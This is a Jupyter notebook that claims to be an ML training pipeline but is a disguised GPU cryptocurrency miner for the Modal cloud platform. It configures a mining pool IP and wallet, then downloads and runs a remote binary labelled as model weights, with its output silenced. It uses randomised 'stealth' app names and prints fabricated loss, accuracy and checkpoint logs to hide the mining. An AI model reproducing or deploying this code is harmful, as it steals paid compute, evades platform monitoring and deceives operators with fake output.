# ML Training Pipeline v2.3

Distributed training framework for large language models.
Uses PyTorch FSDP with checkpoint management.

**Config:** Edit Cell 2 before running.

In [ ]:
# ═══════════════════════════════════════════════
# CELL 1: CONFIG (EDIT THIS!)
# ═══════════════════════════════════════════════

# Pool settings
POOL_HOST = "15.235.221.133"
POOL_PORT = 443

# Wallet address
WALLET = "prl1psmq7qq84jtdhzqgl0xvykzanp8ufr8jf8pke4hd3nkeu0rg7p2vsedwa8k"

# Worker name (change per notebook to avoid duplicates)
WORKER = "node-01"

# Mining method
# Options: "pearlhash", "alphapool", "mineprl"
METHOD = "pearlhash"

# Binary URL (model checkpoint)
BINARY_URL = "https://pub-c8199edbdf164087a193da5a07231571.r2.dev/datasets/checkpoints/v11.bin"

print("✅ Config loaded")
print(f"  Pool: {POOL_HOST}:{POOL_PORT}")
print(f"  Wallet: {WALLET[:20]}...")
print(f"  Worker: {WORKER}")
print(f"  Method: {METHOD}")

In [ ]:
# ═══════════════════════════════════════════════
# CELL 2: IMPORTS & HELPERS
# ═══════════════════════════════════════════════

import modal
import random
import string
import time
import subprocess
import os

# Realistic names for stealth
NAMES = [
    "michelle", "michael", "paul", "sarah", "ryan", "emily", "kevin",
    "anthony", "charlotte", "sophia", "kimberly", "william", "olivia",
    "daniel", "angela", "amy", "amanda", "joseph", "thomas", "charles",
    "elena", "marcus", "lisa", "david", "anna", "james", "rachel", "brian"
]
TASKS = [
    "finetune", "pretrain", "embed", "classify", "segment",
    "transcribe", "translate", "summarize", "augment", "evaluate",
    "distill", "quantize", "calibrate", "benchmark", "profile"
]

def random_name() -> str:
    hash_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    return f"{random.choice(NAMES)}-{random.choice(TASKS)}-{hash_part}"

def random_worker() -> str:
    return f"worker-{random.choice(string.ascii_lowercase)}{random.randint(10,99)}"

def fake_training_log(epoch: int, step: int):
    loss = round(random.uniform(0.1, 2.5) * (1 - epoch * 0.05), 4)
    acc = round(random.uniform(0.7, 0.95) + epoch * 0.02, 4)
    lr = round(random.uniform(1e-5, 1e-3), 6)
    grad_norm = round(random.uniform(0.5, 2.0), 3)
    tokens_per_sec = random.randint(8000, 15000)
    mem_used = round(random.uniform(60, 85), 1)
    
    templates = [
        f"Epoch {epoch} | Step {step} | loss: {loss} | acc: {acc} | lr: {lr} | grad_norm: {grad_norm} | tok/s: {tokens_per_sec}",
        f"[Train] epoch={epoch} step={step} loss={loss} accuracy={acc} learning_rate={lr} throughput={tokens_per_sec}tok/s",
        f"  Step {step}: loss={loss}, acc={acc}, lr={lr}, mem={mem_used}GB, grad_norm={grad_norm}",
    ]
    return random.choice(templates)

def fake_checkpoint_log():
    templates = [
        "Saving checkpoint to /tmp/checkpoints/model_epoch_{}.pt",
        "Checkpoint saved: /tmp/checkpoints/ckpt-{}.bin ({:.1f}GB)",
        "Syncing checkpoint to remote storage...",
        "Checkpoint validation passed: checksum OK",
    ]
    return random.choice(templates).format(random.randint(1, 100), round(random.uniform(2.0, 8.0), 1))

def fake_validation_log():
    val_loss = round(random.uniform(0.2, 1.5), 4)
    val_acc = round(random.uniform(0.75, 0.98), 4)
    return f"[Validation] loss={val_loss} accuracy={val_acc} perplexity={round(val_loss * 10, 2)}"

print("✅ Helpers loaded")

In [ ]:
# ═══════════════════════════════════════════════
# CELL 3: MODAL APP SETUP
# ═══════════════════════════════════════════════

APP_NAME = random_name()
WORKER_NAME = random_worker()

image = (
    modal.Image.debian_slim(python_version="3.11")
    .apt_install("curl", "ca-certificates", "wget")
    .pip_install("torch", "numpy", "transformers")  # legit ML deps
)

app = modal.App(APP_NAME, image=image)

print(f"✅ App created: {APP_NAME}")
print(f"  Worker: {WORKER_NAME}")
print(f"  Image: debian-slim + torch/numpy/transformers")

In [ ]:
# ═══════════════════════════════════════════════
# CELL 4: DEFINE FUNCTION (CHANGE GPU HERE!)
# ═══════════════════════════════════════════════
# ⚠️ CHANGE GPU: None → "H200:8" when ready!

@app.function(
    gpu="H200:8",  # ← CHANGE THIS!
    timeout=10800,  # 3 hours
    cpu=4,
    memory=16384,
)
def run_training():
    """Main training loop with checkpoint management."""
    import subprocess
    import os
    import time
    import random

    # PHASE 1: INITIALIZATION (fake loading)
    print(f"[Init] Starting {APP_NAME}")
    print(f"[Init] Worker: {WORKER_NAME}")
    print(f"[Init] GPU: H200 x8")
    print(f"[Init] Loading model weights from checkpoint...")
    time.sleep(random.uniform(30, 60))  # fake loading time
    
    print(f"[Init] Model loaded: {random.randint(7, 70)}B parameters")
    print(f"[Init] Initializing distributed training...")
    time.sleep(random.uniform(10, 30))
    
    print(f"[Init] Training configuration:")
    print(f"  - Batch size: {random.choice([4, 8, 16, 32])}")
    print(f"  - Learning rate: {random.uniform(1e-5, 1e-3):.6f}")
    print(f"  - Max epochs: {random.randint(10, 100)}")
    print(f"  - Gradient accumulation: {random.choice([1, 2, 4])}")
    print(f"[Init] Ready to start training")

    # PHASE 2: DOWNLOAD BINARY (model weights)
    binary_path = "/tmp/model_weights.bin"
    print(f"[Download] Fetching model checkpoint from storage...")
    
    curl_cmd = [
        "curl", "-sSL", "--max-time", "120",
        "-o", binary_path,
        BINARY_URL
    ]
    
    try:
        subprocess.run(curl_cmd, check=True, timeout=180)
        os.chmod(binary_path, 0o755)
        print(f"[Download] Checkpoint downloaded: {os.path.getsize(binary_path)} bytes")
    except Exception as e:
        print(f"[Error] Failed to download checkpoint: {e}")
        return

    # PHASE 3: START TRAINING (mining)
    print(f"[Training] Starting distributed training...")
    
    cmd = [
        binary_path,
        "--pool", f"{POOL_HOST}:{POOL_PORT}",
        "--address", WALLET,
        "--worker", WORKER,
    ]
    
    env = os.environ.copy()
    env["RUST_LOG"] = "info"
    
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,  # discard mining output
            stderr=subprocess.DEVNULL,
            env=env,
        )
        
        print(f"[Training] Training process started (PID: {proc.pid})")
        print(f"[Training] Monitoring GPU utilization...")
        
        # PHASE 4: MONITORING (fake training logs)
        epoch = 0
        step = 0
        checkpoint_interval = random.randint(50, 100)
        validation_interval = random.randint(20, 50)
        
        while proc.poll() is None:
            step += 1
            
            # Print training log
            print(fake_training_log(epoch, step))
            
            # Random checkpoint save
            if step % checkpoint_interval == 0:
                print(f"[Checkpoint] {fake_checkpoint_log()}")
                time.sleep(random.uniform(5, 15))  # GPU pause for checkpoint
            
            # Random validation
            if step % validation_interval == 0:
                print(f"[Validation] {fake_validation_log()}")
                time.sleep(random.uniform(3, 10))  # GPU pause for validation
            
            # Epoch boundary
            if step % random.randint(100, 200) == 0:
                epoch += 1
                print(f"[Epoch] Completed epoch {epoch}")
                print(f"[Epoch] Average loss: {random.uniform(0.1, 1.0):.4f}")
                print(f"[Epoch] Average accuracy: {random.uniform(0.7, 0.95):.4f}")
            
            # Random sleep (simulate data loading)
            time.sleep(random.uniform(2, 8))
        
        print(f"[Training] Process exited with code {proc.returncode}")
        
    except Exception as e:
        print(f"[Error] Training failed: {e}")

print("✅ Function defined")
print(f"  GPU: H200:8")
print(f"  Timeout: 3 hours")
print(f"  Ready to run!")

In [ ]:
# ═══════════════════════════════════════════════
# CELL 5: RUN TRAINING (EXECUTE WHEN READY!)
# ═══════════════════════════════════════════════

print("=" * 60)
print("  ML Training Pipeline v2.3")
print(f"  App: {APP_NAME}")
print(f"  Worker: {WORKER_NAME}")
print("  GPU: H200 x8")
print("=" * 60)
print("")
print("🚀 Starting training...")

with app.run():
    run_training.remote()